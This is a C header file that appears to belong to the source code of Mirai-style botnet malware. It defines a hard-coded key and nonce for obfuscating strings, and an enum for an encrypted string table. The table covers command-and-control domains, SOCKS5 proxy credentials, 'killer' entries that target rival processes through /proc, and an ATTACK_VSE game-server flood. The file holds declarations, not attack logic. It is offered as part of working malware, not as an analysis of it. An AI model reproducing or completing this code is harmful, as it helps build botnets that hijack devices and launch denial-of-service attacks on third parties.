#pragma once

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdint.h>
#include <stdlib.h>

#include "../utils/headers/includes.h"
#include "../utils/headers/util.h"
#include "../modules/debug.h"

static uint8_t key[] = {
    0x16, 0x1e, 0x19, 0x1b,
    0x11, 0x1f, 0x00, 0x1d,
    0x04, 0x1c, 0x0e, 0x08,
    0x0b, 0x1a, 0x12, 0x07,
    0x05, 0x09, 0x0d, 0x0f,
    0x06, 0x0a, 0x15, 0x01,
    0x0c, 0x14, 0x1f, 0x17,
    0x02, 0x03, 0x13, 0x18};

static uint8_t nonce[] = {
    0x1e, 0x00, 0x4a, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};

typedef struct
{
    char *string;
    int len, locked;
} Encryption;

typedef enum
{
    EXECUTE_MESSAGE,
    PROC_NAME,

    MALWARE_VERSION,

    C2_DOMAIN_1,
    C2_DOMAIN_2,
    C2_DOMAIN_3,

    SOCKS5_USER,
    SOCKS5_PASS,

    KILLER_PROC,
    KILLER_EXE,
    KILLER_MAPS,
    KILLER_STATS,
    KILLER_STACK,
    KILLER_FD,
    KILLER_CMDLINE,

    PROC_NET_TCP,
    PROC_SELF_EXE,

    ATTACK_VSE,

    ENC_TABLE_MAX,
} EncryptionTable;

extern Encryption *enc;

void xor_init(void);
